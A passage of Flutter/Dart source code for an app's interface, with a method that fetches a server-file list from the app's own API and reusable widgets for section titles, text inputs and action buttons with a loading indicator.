                      _showSnack('URL disalin!');
                    },
                  ),
                ],
              ),
            );
          }).toList(),
        );
      },
    );
  }

  Future<List<Map<String, dynamic>>> _fetchServerFiles() async {
    try {
      final res = await http.get(
        Uri.parse('$_kBaseUrl/api/server-files'),
        headers: _headers,
      );
      final data = jsonDecode(res.body);
      if (data['success'] == true) {
        return List<Map<String, dynamic>>.from(data['files'] ?? []);
      }
    } catch (_) {}
    return [];
  }

  // ──────────────────────────────────────────────
  //  REUSABLE WIDGETS
  // ──────────────────────────────────────────────
  Widget _tabScroll(List<Widget> children) {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: children,
      ),
    );
  }

  Widget _sectionTitle(String title, IconData icon) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 14),
      child: Row(
        children: [
          Icon(icon, color: _kGreen, size: 16),
          const SizedBox(width: 8),
          Text(
            title,
            style: const TextStyle(
              color: _kGreen,
              fontSize: 13,
              fontWeight: FontWeight.w700,
              fontFamily: 'Orbitron',
              letterSpacing: 1.5,
            ),
          ),
          const SizedBox(width: 12),
          Expanded(child: Container(height: 1, color: _kGreen.withOpacity(0.2))),
        ],
      ),
    );
  }

  Widget _inputField(
    String label,
    TextEditingController ctrl, {
    String? hint,
    int maxLines = 1,
    TextInputType keyboardType = TextInputType.text,
  }) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 10),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(label,
              style: const TextStyle(
                  color: Colors.white54, fontFamily: 'ShareTechMono', fontSize: 11, letterSpacing: 0.8)),
          const SizedBox(height: 6),
          TextField(
            controller: ctrl,
            maxLines: maxLines,
            keyboardType: keyboardType,
            style: const TextStyle(color: Colors.white, fontFamily: 'ShareTechMono', fontSize: 13),
            decoration: InputDecoration(
              hintText: hint,
              hintStyle: TextStyle(color: Colors.white24, fontFamily: 'ShareTechMono', fontSize: 12),
              filled: true,
              fillColor: _kBgCard2,
              contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
              enabledBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(12),
                borderSide: BorderSide(color: Colors.white.withOpacity(0.08)),
              ),
              focusedBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(12),
                borderSide: const BorderSide(color: _kGreen, width: 1.5),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _actionButton({
    required String label,
    required IconData icon,
    required VoidCallback onTap,
    Color color = _kGreen,
    bool fullWidth = false,
  }) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 8),
      child: SizedBox(
        width: fullWidth ? double.infinity : null,
        child: GestureDetector(
          onTap: _isSending ? null : onTap,
          child: AnimatedContainer(
            duration: const Duration(milliseconds: 150),
            padding: const EdgeInsets.symmetric(vertical: 13, horizontal: 16),
            decoration: BoxDecoration(
              color: color.withOpacity(_isSending ? 0.05 : 0.12),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: color.withOpacity(_isSending ? 0.2 : 0.45)),
              boxShadow: _isSending
                  ? []
                  : [BoxShadow(color: color.withOpacity(0.08), blurRadius: 8)],
            ),
            child: Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                if (_isSending)
                  SizedBox(
                    width: 14,
                    height: 14,
                    child: CircularProgressIndicator(color: color, strokeWidth: 2),
                  )
                else
                  Icon(icon, color: color, size: 16),
                const SizedBox(width: 8),
                Text(
                  label,
                  style: TextStyle(
                    color: _isSending ? color.withOpacity(0.4) : color,
                    fontFamily: 'ShareTechMono',
                    fontSize: 12,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 0.8,
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}
